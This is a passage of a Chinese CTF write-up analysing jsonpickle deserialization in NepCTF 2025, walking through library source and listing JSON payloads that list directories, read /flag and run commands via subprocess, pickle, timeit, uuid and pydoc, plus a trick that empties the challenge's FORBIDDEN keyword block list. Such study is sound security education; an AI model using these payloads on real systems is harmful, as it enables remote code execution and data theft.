+</h3><p>_restore_object() 方法上面分析过，第二行调用 loadclass()，能够导入库返回库方法对象，比如传入 nt.system，会基于 tags.NEWARGSEX 识别传参，通过 split 分割为 [&rsquo;nt&rsquo;,&lsquo;system&rsquo;]，先导入 nt 模块，然后取出 nt.system 方法并返回；随后会调用 _restore_object_instance</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">_restore_object_instance</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">obj</span><span class="p">,</span> <span class="bp">cls</span><span class="p">,</span> <span class="n">class_name</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="n">proxy</span> <span class="o">=</span> <span class="n">_Proxy</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">	<span class="bp">self</span><span class="o">.</span><span class="n">_mkref</span><span class="p">(</span><span class="n">proxy</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">factory</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_loadfactory</span><span class="p">(</span><span class="n">obj</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="n">has_tag</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="n">tags</span><span class="o">.</span><span class="n">NEWARGSEX</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">		<span class="n">args</span><span class="p">,</span> <span class="n">kwargs</span> <span class="o">=</span> <span class="n">obj</span><span class="p">[</span><span class="n">tags</span><span class="o">.</span><span class="n">NEWARGSEX</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">	<span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">		<span class="n">args</span> <span class="o">=</span> <span class="n">getargs</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="n">classes</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">_classes</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="n">kwargs</span> <span class="o">=</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="n">args</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">		<span class="n">args</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_restore</span><span class="p">(</span><span class="n">args</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="n">kwargs</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">		<span class="n">kwargs</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_restore</span><span class="p">(</span><span class="n">kwargs</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">is_oldstyle</span> <span class="o">=</span> <span class="ow">not</span> <span class="p">(</span><span class="nb">isinstance</span><span class="p">(</span><span class="bp">cls</span><span class="p">,</span> <span class="nb">type</span><span class="p">)</span> <span class="ow">or</span> <span class="nb">getattr</span><span class="p">(</span><span class="bp">cls</span><span class="p">,</span> <span class="s1">&#39;__meta__&#39;</span><span class="p">,</span> <span class="kc">None</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">	<span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="ow">not</span> <span class="n">is_oldstyle</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">hasattr</span><span class="p">(</span><span class="bp">cls</span><span class="p">,</span> <span class="s1">&#39;__new__&#39;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">			<span class="c1"># new style classes</span>
+</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="n">factory</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">				<span class="n">instance</span> <span class="o">=</span> <span class="bp">cls</span><span class="o">.</span><span class="fm">__new__</span><span class="p">(</span><span class="bp">cls</span><span class="p">,</span> <span class="n">factory</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">				<span class="n">instance</span><span class="o">.</span><span class="n">default_factory</span> <span class="o">=</span> <span class="n">factory</span>
+</span></span><span class="line"><span class="cl">			<span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">				<span class="n">instance</span> <span class="o">=</span> <span class="bp">cls</span><span class="o">.</span><span class="fm">__new__</span><span class="p">(</span><span class="bp">cls</span><span class="p">,</span> <span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">			<span class="n">instance</span> <span class="o">=</span> <span class="nb">object</span><span class="o">.</span><span class="fm">__new__</span><span class="p">(</span><span class="bp">cls</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">except</span> <span class="ne">TypeError</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="n">is_oldstyle</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">		<span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">			<span class="n">instance</span> <span class="o">=</span> <span class="bp">cls</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="k">except</span> <span class="ne">TypeError</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">			<span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">			<span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">			<span class="o">...</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">instance</span><span class="p">,</span> <span class="nb">tuple</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="n">instance</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="n">_safe_hasattr</span><span class="p">(</span><span class="n">instance</span><span class="p">,</span> <span class="s1">&#39;default_factory&#39;</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">isinstance</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">	<span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="o">...</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">instance</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div></div><p>instance = cls(*args)，这和 py/reduce 一样也能达到命令执行的效果!
+args 可以通过 tags.NEWARGSEX 属性赋值</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">if has_tag(obj, tags.NEWARGSEX):
+</span></span><span class="line"><span class="cl">		args, kwargs = obj[tags.NEWARGSEX]
+</span></span><span class="line"><span class="cl">else:
+</span></span><span class="line"><span class="cl">	args = getargs(obj, classes=self._classes)
+</span></span><span class="line"><span class="cl">	kwargs = {}
+</span></span><span class="line"><span class="cl">if args:
+</span></span><span class="line"><span class="cl">	args = self._restore(args)
+</span></span><span class="line"><span class="cl">if kwargs:
+</span></span><span class="line"><span class="cl">	kwargs = self._restore(kwargs)</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>也可以走入 else，通过 getargs 赋值，如果是 py/newargs、py/initargs 会 return obj[tags.newargs/initargs]</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">getargs</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="n">classes</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">has_tag</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="n">tags</span><span class="o">.</span><span class="n">NEWARGSEX</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&#34;__newargs_ex__ returns both args and kwargs&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">has_tag</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="n">tags</span><span class="o">.</span><span class="n">NEWARGS</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">obj</span><span class="p">[</span><span class="n">tags</span><span class="o">.</span><span class="n">NEWARGS</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">has_tag</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="n">tags</span><span class="o">.</span><span class="n">INITARGS</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">obj</span><span class="p">[</span><span class="n">tags</span><span class="o">.</span><span class="n">INITARGS</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">seq_list</span> <span class="o">=</span> <span class="n">obj</span><span class="p">[</span><span class="n">tags</span><span class="o">.</span><span class="n">SEQ</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">obj_dict</span> <span class="o">=</span> <span class="n">obj</span><span class="p">[</span><span class="n">tags</span><span class="o">.</span><span class="n">OBJECT</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">KeyError</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">typeref</span> <span class="o">=</span> <span class="n">loadclass</span><span class="p">(</span><span class="n">obj_dict</span><span class="p">,</span> <span class="n">classes</span><span class="o">=</span><span class="n">classes</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">typeref</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">typeref</span><span class="p">,</span> <span class="s1">&#39;_fields&#39;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">typeref</span><span class="o">.</span><span class="n">_fields</span><span class="p">)</span> <span class="o">==</span> <span class="nb">len</span><span class="p">(</span><span class="n">seq_list</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">seq_list</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">[]</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>所以 Payload 可以变为如下，注意 kwargs 必须为一个字典，否则会在 cls(*args) 抛出异常</p>
+<json-viewer value="&#34;{\&#34;py/object\&#34;: \&#34;subprocess.run\&#34;,\&#34;py/newargsex\&#34;: [[\&#34;whoami\&#34;],{}]}\n{\&#34;py/object\&#34;: \&#34;subprocess.run\&#34;,\&#34;py/newargs\&#34;:[\&#34;whoami\&#34;]}\n{\&#34;py/object\&#34;: \&#34;subprocess.run\&#34;,\&#34;py/initargs\&#34;:[\&#34;whoami\&#34;]}&#34;" expand-depth="1" boxed copyable="{&#34;copiedText&#34;:&#34;Copied&#34;,&#34;copyText&#34;:&#34;Copy&#34;}"></json-viewer><p>subprocess.run 可以替换为任意能够达到命令执行、文件读取等功能的函数</p>
+<h3 class="heading-element" id="pysetpytuple-标签"><span><code>py/set、py/tuple</code> 标签</span>
+  <a href="#pysetpytuple-%e6%a0%87%e7%ad%be" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>这两个标签功能都是帮助取出键值对，也能拿到需要的参数</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">_restore_tuple</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">obj</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nb">tuple</span><span class="p">([</span><span class="bp">self</span><span class="o">.</span><span class="n">_restore</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="k">for</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">obj</span><span class="p">[</span><span class="n">tags</span><span class="o">.</span><span class="n">TUPLE</span><span class="p">]])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">_restore_set</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">obj</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="p">{</span><span class="bp">self</span><span class="o">.</span><span class="n">_restore</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="k">for</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">obj</span><span class="p">[</span><span class="n">tags</span><span class="o">.</span><span class="n">SET</span><span class="p">]}</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>Payload</p>
+<json-viewer value="&#34;{\&#34;py/reduce\&#34;: [{\&#34;py/function\&#34;: \&#34;subprocess.run\&#34;}, {\&#34;py/tuple\&#34;: [\&#34;whoami\&#34;]}]}\n{\&#34;py/reduce\&#34;: [{\&#34;py/function\&#34;: \&#34;subprocess.run\&#34;}, {\&#34;py/set\&#34;: [\&#34;whoami\&#34;]}]}&#34;" expand-depth="1" boxed copyable="{&#34;copiedText&#34;:&#34;Copied&#34;,&#34;copyText&#34;:&#34;Copy&#34;}"></json-viewer><h3 class="heading-element" id="pytype-标签"><span><code>py/type</code> 标签</span>
+  <a href="#pytype-%e6%a0%87%e7%ad%be" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>py/type 也有 loadclass，传入 obj[tags.TYPE]，说明同样能够导入模块方法</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">_restore_type</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">obj</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="n">typeref</span> <span class="o">=</span> <span class="n">loadclass</span><span class="p">(</span><span class="n">obj</span><span class="p">[</span><span class="n">tags</span><span class="o">.</span><span class="n">TYPE</span><span class="p">],</span> <span class="n">classes</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">_classes</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="n">typeref</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="n">obj</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">typeref</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><h2 class="heading-element" id="waf-绕过"><span>WAF 绕过</span>
+  <a href="#waf-%e7%bb%95%e8%bf%87" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p><strong>总结一下：</strong>
+导入库：py/object、py/type、py/function
+获取参数：py/newargsex、py/newargs、py/initargs、py/tuple
+命令执行：py/reduce、py/object</p>
+<p>列目录</p>
+<json-viewer value="&#34;{&#39;py/object&#39;: &#39;glob.glob&#39;, &#39;py/newargs&#39;: {&#39;/*&#39;}}\n{&#39;py/object&#39;: &#39;os.listdir&#39;, &#39;py/newargs&#39;: [&#39;/&#39;]}&#34;" expand-depth="1" boxed copyable="{&#34;copiedText&#34;:&#34;Copied&#34;,&#34;copyText&#34;:&#34;Copy&#34;}"></json-viewer><p>读文件</p>
+<json-viewer value="&#34;{&#39;py/object&#39;: &#39;linecache.getlines&#39;, &#39;py/newargs&#39;: [&#39;/flag&#39;]}&#34;" expand-depth="1" boxed copyable="{&#34;copiedText&#34;:&#34;Copied&#34;,&#34;copyText&#34;:&#34;Copy&#34;}"></json-viewer><p>RCE</p>
+<json-viewer value="&#34;{&#39;py/object&#39;: &#39;subprocess.run&#39;, &#39;py/newargs&#39;: [&#39;calc&#39;]}\n{&#39;py/object&#39;: &#39;subprocess.getoutput&#39;, &#39;py/newargs&#39;: [&#39;calc&#39;]}\n{&#39;py/object&#39;: &#39;pickle.loads&#39;, &#39;py/newargs&#39;: [{&#39;py/b64&#39;:&#39;KGNvcwpzeXN0ZW0KUydiYXNoIC1jICJjYWxjIicKby4=&#39;}]}\n{&#39;py/object&#39;: &#39;timeit.main&#39;, &#39;py/newargs&#39;: [[&#39;-r&#39;, &#39;1&#39;, &#39;-n&#39;, &#39;1&#39;, &#39;__import__(\&#34;os\&#34;).system(\&#34;calc\&#34;)&#39;]]}\n{&#39;py/object&#39;: &#39;uuid._get_command_stdout&#39;, &#39;py/newargs&#39;: [&#39;calc&#39;]}\n{&#39;py/object&#39;: &#39;pydoc.pipepager&#39;, &#39;py/newargs&#39;: [&#39;a&#39;, &#39;calc&#39;]}\n{\&#34;py/object\&#34;:\&#34;builtins.bytes\&#34;, \&#34;py/newargs\&#34;:{\&#34;py/object\&#34;: \&#34;builtins.map\&#34;, \&#34;py/newargs\&#34; : [{\&#34;py/function\&#34;: \&#34;builtins.exec\&#34;}, [\&#34;print(123)\&#34;]]}}&#34;" expand-depth="1" boxed copyable="{&#34;copiedText&#34;:&#34;Copied&#34;,&#34;copyText&#34;:&#34;Copy&#34;}"></json-viewer><p>最后回顾一下之前的 FORBIDDEN</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">FORBIDDEN = [&#39;builtins&#39;, &#39;os&#39;, &#39;system&#39;, &#39;repr&#39;, &#39;__class__&#39;, &#39;subprocess&#39;, &#39;popen&#39;, &#39;Popen&#39;, &#39;nt&#39;,&#39;code&#39;, &#39;reduce&#39;, &#39;compile&#39;, &#39;command&#39;, &#39;pty&#39;, &#39;platform&#39;, &#39;pdb&#39;, &#39;pickle&#39;, &#39;marshal&#39;,&#39;socket&#39;, &#39;threading&#39;, &#39;multiprocessing&#39;, &#39;signal&#39;, &#39;traceback&#39;, &#39;inspect&#39;, &#39;\\\\\\\\&#39;, &#39;posix&#39;,&#39;render_template&#39;, &#39;jsonpickle&#39;, &#39;cgi&#39;, &#39;execfile&#39;, &#39;importlib&#39;, &#39;sys&#39;, &#39;shutil&#39;, &#39;state&#39;,&#39;import&#39;, &#39;ctypes&#39;, &#39;timeit&#39;, &#39;input&#39;, &#39;open&#39;, &#39;codecs&#39;, &#39;base64&#39;, &#39;jinja2&#39;, &#39;re&#39;, &#39;json&#39;,&#39;file&#39;, &#39;write&#39;, &#39;read&#39;, &#39;globals&#39;, &#39;locals&#39;, &#39;getattr&#39;, &#39;setattr&#39;, &#39;delattr&#39;, &#39;uuid&#39;,&#39;__import__&#39;, &#39;__globals__&#39;, &#39;__code__&#39;, &#39;__closure__&#39;, &#39;__func__&#39;, &#39;__self__&#39;, &#39;pydoc&#39;,&#39;__module__&#39;, &#39;__dict__&#39;, &#39;__mro__&#39;, &#39;__subclasses__&#39;, &#39;__init__&#39;, &#39;__new__&#39;]</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>初看 ban 了很多，但实际上标签只禁了 py/reduce、py/repr，还能使用 py/object 进行命令执行。最后一个骚操作，由于 FORBIDDEN 是一个列表，可以直接用 list.clear() 给它扬了</p>
+<json-viewer value="&#34;{\&#34;py/object\&#34;: \&#34;__main__.Session\&#34;, \&#34;meta\&#34;: {\&#34;user\&#34;: {\&#34;py/object\&#34;:\&#34;__main__.FORBIDDEN.clear\&#34;,\&#34;py/newargs\&#34;: []},\&#34;ts\&#34;:1754463892}}&#34;" expand-depth="1" boxed copyable="{&#34;copiedText&#34;:&#34;Copied&#34;,&#34;copyText&#34;:&#34;Copy&#34;}"></json-viewer><p><figure>
+  <img src="file-20250808170314416.png" alt="" loading="lazy"></figure>
+
+这样列表就被置空，Payload 随便用了</p>
+<p><strong>参考：</strong>
+<a href="https://xz.aliyun.com/news/16133" target="_blank" rel="external nofollow noopener noreferrer">https://xz.aliyun.com/news/16133</a>
+<a href="https://xz.aliyun.com/news/16098" target="_blank" rel="external nofollow noopener noreferrer">https://xz.aliyun.com/news/16098</a>
+<a href="https://xz.aliyun.com/news/16041" target="_blank" rel="external nofollow noopener noreferrer">https://xz.aliyun.com/news/16041</a>
+<a href="https://www.cnblogs.com/LAMENTXU/articles/18799383" target="_blank" rel="external nofollow noopener noreferrer">https://www.cnblogs.com/LAMENTXU/articles/18799383</a></p>
+</div><div id="comments"><div id="giscus" class="comment">
+          <script
+            src="https://giscus.app/client.js"
+            data-repo="L1nq0/L1nq0.github.io"
+            data-repo-id="R_kgDOSLdcIg"
+            data-category="Announcements"
+            data-category-id="DIC_kwDOSLdcIs4DA03P"
+            data-mapping="pathname"
+            data-strict="0"
+            
+            data-theme="preferred_color_scheme"
+            data-reactions-enabled="1"
+            data-emit-metadata="0"
+            data-input-position="bottom"
+            data-lang="zh-CN"
+            data-loading="lazy"
+            crossorigin="anonymous"
+            async
+            defer
+          ></script>
+        </div>
+        <noscript>
+          Please enable JavaScript to view the comments powered by <a href="https://giscus.app/" rel="external nofollow noopener noreferrer">giscus</a>.
+        </noscript></div><div class="post-footer" id="post-footer"><ul class="post-footer-tags"><li class="post-footer-tag-item">
+          <a href="/tags/unserialize/" class="post-footer-tag-link" title="Tags - Unserialize">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="post-footer-tag-icon"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9l14 0"/><path d="M5 15l14 0"/><path d="M11 4l-4 16"/><path d="M17 4l-4 16"/></svg>
+            <span>Unserialize</span>
+          </a>
+        </li></ul><div class="post-footer-share">
+    <span class="post-footer-share-label">Share this post on:</span>
+    <div class="post-footer-share-links"><a href="javascript:void(0);" title="Share on X" data-sharer="twitter" data-url="https://sw1mblu3.fun/posts/%E5%9F%BA%E4%BA%8E-nepctf-2025-jsonpickle-safe-%E6%A8%A1%E5%BC%8F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E-waf-%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/" data-title="基于 NEPCTF 2025 JsonPickle Safe 模式反序列化与 WAF 绕过分析" data-via="map[icon:map[angellist: bandcamp: behance: bilibili: bitbucket: bluesky: buymeacoffee: class:fa-brands fa-x-twitter codepen: credly: csdn: deviantart: devto: diaspora: discord: discordinvite: douban: douyin: dribbble: facebook: feishu: fivehundredpx: flickr: foursquare: freecodecamp: gitea: gitlab: goodreads: googlescholar: hackernews: hackthebox: instagram: jsfiddle: kaggle: keybase: kickstarter: ko-fi: lastfm: liberapay: lichess: linktree: mastodon: matrix: mediawiki: medium: mix: odnoklassniki: orcid: patreon: paypal: phone: pinterest: pleroma: plume: qq: qqgroup: quora: reddit: researchgate: rootme: skype: slidershare: snapchat: soundcloud: spotify: stackoverflow: steam: strava: telegram: thingiverse: tiktok: tryhackme: tumblr: twitch: vine: vk: weibo: whatsapp: wordpress: xing: xmpp: youtubechannel: youtubecustom: youtubelegacy: zhihu:] id:L1nq1_ prefix:https://x.com/ title:X weight:2]" data-hashtags="Unserialize"><i class="fa-brands fa-x-twitter" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://sw1mblu3.fun/posts/%E5%9F%BA%E4%BA%8E-nepctf-2025-jsonpickle-safe-%E6%A8%A1%E5%BC%8F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E-waf-%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/" data-hashtag="Unserialize"><i class="fa-brands fa-facebook-square" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://sw1mblu3.fun/posts/%E5%9F%BA%E4%BA%8E-nepctf-2025-jsonpickle-safe-%E6%A8%A1%E5%BC%8F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E-waf-%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/" data-title="基于 NEPCTF 2025 JsonPickle Safe 模式反序列化与 WAF 绕过分析"><i class="fa-brands fa-weibo" aria-hidden="true"></i></a>
+  </div>
+  </div><hr class="post-footer-divider">
+    <div class="post-footer-nav"><a href="/posts/%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A8-2025-web-writeup/" class="post-footer-nav-prev" rel="prev">
